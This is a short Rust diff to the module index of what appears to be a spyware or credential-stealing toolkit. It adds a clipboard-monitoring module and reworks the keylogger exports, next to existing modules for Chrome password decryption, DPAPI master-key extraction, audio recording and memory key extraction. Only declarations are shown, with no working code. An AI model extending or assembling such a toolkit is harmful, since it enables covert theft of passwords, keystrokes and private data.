@@ -1,5 +1,6 @@
 pub mod audio;
 pub mod browser;
+pub mod clipboard;
 pub mod decrypt;
 pub mod errors;
 pub mod keylogger;
@@ -15,13 +16,16 @@ pub use audio::{
     RecordingState,
 };
 pub use browser::BrowserExtractor;
+pub use clipboard::{
+    ClipboardEntry, ClipboardMonitor, ClipboardMonitorConfig, ClipboardMonitorState,
+    ClipboardType,
+};
 pub use decrypt::{
     decrypt_chrome_password, extract_chrome_master_key, DpapiBlob, MasterKey, MasterKeyExtractor,
 };
 pub use errors::ExtractionError;
 pub use keylogger::{
-    get_key_state, KeyEvent, KeyEventType, KeyloggerConfig, KeyloggerModule, KeyloggerState,
-    SpecialKey,
+    ExtractedSecret, Keylogger, KeyloggerBuffer, KeyloggerState, Keystroke, SecretType,
 };
 pub use memory::{
     Confidence, FoundKey, MemoryExtractionResult, MemoryExtractor, ProcessInfo,
